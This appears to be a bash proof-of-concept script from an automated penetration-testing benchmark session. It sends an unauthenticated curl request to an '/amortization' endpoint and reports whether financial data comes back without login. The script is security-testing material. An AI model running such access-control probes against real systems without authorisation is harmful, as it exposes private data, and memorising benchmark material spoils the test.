#!/bin/bash
# POC: Demonstrates unauthenticated access to the /amortization endpoint without login credentials
# Target: ./repo
# Created: 2025-11-04T19:44:24.464Z
# Session: benchmark-XBEN-023-24-mhkytbq3

# Authorization Bypass POC - Unauthenticated Access to /amortization Endpoint
# This script demonstrates that the /amortization endpoint is accessible without authentication

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
ENDPOINT="http://${TARGET_HOST}:${TARGET_PORT}/amortization"

echo "=========================================="
echo "Authorization Bypass POC - /amortization Endpoint"
echo "=========================================="
echo ""

# Test 1: Access /amortization without authentication
echo "[*] Test 1: Attempting to access /amortization without authentication cookie..."
echo "[*] URL: ${ENDPOINT}?term=60"
echo ""

RESPONSE=$(curl -s -i "${ENDPOINT}?term=60" 2>&1)
HTTP_CODE=$(echo "${RESPONSE}" | head -n 1)
BODY=$(echo "${RESPONSE}" | tail -n +1)

echo "[*] HTTP Response:"
echo "${HTTP_CODE}"
echo ""

# Check if we got a 200 response (indicates the endpoint is accessible without auth)
if echo "${HTTP_CODE}" | grep -q "200 OK"; then
    echo "[+] SUCCESS: Endpoint returned HTTP 200 without authentication!"
    echo "[+] This confirms the endpoint is accessible without login."
    echo ""
    
    # Check if response contains amortization table data
    if echo "${BODY}" | grep -q -i "table\|payment\|amortization\|month"; then
        echo "[+] Response contains financial data (table/payment/amortization content)"
        echo "[+] Vulnerability confirmed: Unauthenticated user can access financial calculations"
        echo ""
        echo "[*] Response excerpt (first 500 chars):"
        echo "${BODY}" | head -c 500
        echo ""
        echo ""
        exit 0
    else
        echo "[!] HTTP 200 returned but content appears to be error/login page"
        echo "[!] First 200 chars of response:"
        echo "${BODY}" | head -c 200
        exit 1
    fi
elif echo "${HTTP_CODE}" | grep -q "401\|403\|302"; then
    echo "[-] FAILED: Endpoint returned authentication error (${HTTP_CODE})"
    echo "[-] Endpoint appears to be properly protected"
    exit 1
else
    echo "[-] FAILED: Unexpected response code"
    echo "${HTTP_CODE}"
    exit 1
fi